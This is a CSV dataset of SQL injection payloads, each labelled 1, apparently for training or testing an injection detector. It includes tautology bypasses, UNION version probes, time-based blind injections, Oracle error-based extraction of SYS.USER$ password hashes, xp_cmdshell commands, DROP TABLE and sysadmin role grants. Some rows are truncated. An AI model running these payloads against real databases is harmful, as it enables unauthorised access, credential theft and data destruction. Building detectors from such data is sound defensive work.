Query,Label
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
||6,1
or 1/*,1
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
select * from users where id  =  1.%@ or 1  =  1 -- 1,1
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1
" or 1  =  1 or """"  =  ",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
or 'whatever' in   (  'whatever'  ) ,1
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
select * from users where id  =  '1'   or 1  =  1 -- 1',1
?,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1
"admin""  )   or   (  ""1""  =  ""1""#",1
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1
 or '' ',1
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
or 1  =  1,1
 ; drop table temp --,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1
""" or ""x""  =  ""x",1
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1
 or 'something' like 'some%',1
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
admin' or '1'  =  '1'--,1
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1
""";waitfor delay '0:0:__TIME__'--",1
x' and userid is NULL; --,1
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1
’ or ‘1’  =  ’1,1
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1
admin'or 1  =  1 or ''  =  ',1
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1
 or 1  =  1,1
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1
x' AND email IS NULL; --,1
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1
 --,1
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1
update,1
 or 1/*,1
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1
"""   )    )    or pg_sleep  (  __TIME__  )  --",1
||'6,1
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
or   (  EXISTS  ) ,1
^',1
or 'text'   =   n'text',1
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1
 or 0  =  0 --,1
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1
password:*/  =  1--,1
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1
" union   (  select NULL,   (  select @@version   )    )    --",1
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1
" select * from users where id  =  1. union select null,version  (    )   -- 1",1
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1
UNION SELECT,1
asc,1
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1
  )   or true--,1
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
 or userid like '%,1
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1
/,1
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1
"admin""/*",1
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",1
 )  ;waitfor delay '0:0:__TIME__'--,1
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1
"admin"" or ""1""  =  ""1",1
 union   (  select @@version  )   --,1
 or ''^',1
"""   )    )    or sleep  (  __TIME__  )    =  """,1
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",1
select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1
" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1
"""hi""""  )   or   (  """"a""""  =  """"a""",1
select name from syscolumns where id   =     (  sele ...,1
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1
 or 2 between 1 and 3,1
union all select @@version--,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
""" or isNULL  (  1/0  )   /*",1
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1
 or 'a'  =  'a,1
 union all select @@version--,1
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1
"admin"" or 1  =  1/*",1
 or   (  EXISTS  ) ,1
" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1
declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1
" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1
" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1
; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,1
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1
hi' or 1  =  1 --,1
 UNION SELECT,1
select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1
" select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1
desc,1
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1
anything' or 'x'  =  'x,1
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1
select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1
0x770061006900740066006F0072002000640065006C00 ...,1
" select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1
or isNULL  (  1/0  )   /*,1
"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1
"admin"" or ""1""  =  ""1""#",1
"admin"" or 1  =  1--",1
 or user like '%,1
admin'  )   or '1'  =  '1,1
""" or sleep  (  __TIME__  )  #",1
" select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1
 or ''-',1
" select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",1
admin'  )   or '1'  =  '1'/*,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1
select * from users where id  =  1 <@$ or 1  =  1 -- 1,1
x' or 1  =  1 or 'x'  =  'y,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1
  )   or   (  'x'  )    =    (  'x,1
 ( ,1
" select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1
 )    )    or sleep  (  __TIME__  )    =  ',1
having 1  =  1--,1
!,1
select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1
 group by userid having 1  =  1--,1
" select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
or 0  =  0 --,1
 or 0  =  0 #,1
or pg_sleep  (  __TIME__  )  --,1
or '1'  =  '1'--,1
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1
sqlvuln,1
" select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",1
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
0x730065006c0065006300740020004000400076006500 ...,1
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1
 or ''&',1
" select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
" select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",1
 or username like char  (  37  )  ;,1
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1
or 'something'   =   'some'+'thing',1
#NAME?,1
or 1 in   (  select @@version  )  --,1
declare @q nvarchar   (  4000  )   select @q   = ,1
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",1
" select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",1
" select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1
" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",1
